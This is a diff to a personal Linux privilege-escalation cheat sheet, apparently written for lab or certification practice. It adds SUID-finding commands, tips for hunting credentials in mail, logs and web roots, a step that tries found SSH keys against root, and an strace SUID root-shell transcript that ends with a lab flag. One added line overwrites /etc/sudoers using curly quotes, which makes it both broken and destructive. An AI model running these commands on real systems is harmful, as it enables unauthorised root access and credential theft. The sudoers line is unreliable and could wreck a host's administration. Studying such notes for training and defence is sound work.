@@ -6,6 +6,7 @@
 id
 cat /etc/passwd
 hostname
+# if not connected to another interface, the machine cannot be used as a pivot point
 ifconfig # or ip a
 cat /etc/issue
 cat /etc/os-release
@@ -148,6 +149,7 @@ find / -perm -u=s -type f 2>/dev/null
 ll $(find / -perm -u=s -type f 2>/dev/null )
 find / -perm -g=s -type f 2>/dev/null
 ll $(find / -perm -g=s -type f 2>/dev/null )
+ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2>/dev/null ) # combined
 ```
 
 In this case, the command found several SUID binaries. Exploitation of SUID binaries will vary based on several factors. For example, if /bin/cp (the copy command) were SUID, we could copy and overwrite sensitive files such as /etc/passwd.
@@ -194,6 +196,7 @@ Whenever you gain access to a user, new or not, run:
 ```bash
 sudo -l # view if your user has any sudo permissions
 sudo -i # if you can run this, you'll be root
+echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers # another reliable way to get sudo
 ```
 
 ### Inspecting Service Footprints
@@ -370,3 +373,48 @@ hydra -l offsec -P wordlist -s 2222 ssh://192.168.12.133
 #### Payload of All Things
 
 Has some amazing enumeration and priv esc commands, 'https://github.com/swisskyrepo/PayloadsAllTheThings'.
+
+#### Check Your ID Group
+
+See if you're in any interesting groups.. this will be a big sign. In this case, I'm in the disk group, which has it's own public privesc vector.
+
+#### /var/spool/mail
+
+Don't forget to check your mail!! 
+
+```bash
+ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
+```
+
+#### Found SSH Keys 
+
+If you find random ssh keys in the environment, you can test them against the users on the box on the loopback:
+
+```bash
+chmod 600 random_key
+ssh -i random_key root@127.0.0.1
+```
+
+#### Credentials in /var/www/html/
+
+If you're stuck, it's a good idea to check the loopback for vulns and to explore the /var/www/html or wherever the website is being hosted. There are often credentials and information that will guide you.
+
+#### Logs
+
+Check the auth.log, access.log, error.log.
+
+#### SUID Weird Persistance
+
+Doesn't say that you're root, but you behave as root. Run 'bash -p -i'.
+
+```bash
+www-data@image:/var/www/html$ strace -o /dev/null /bin/sh -p
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+# bash -p -i
+bash-5.0# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+bash-5.0# cd /root
+bash-5.0# cat proof.txt
+d4eda6b5a66a2db06370f1f7d9545deb
+```
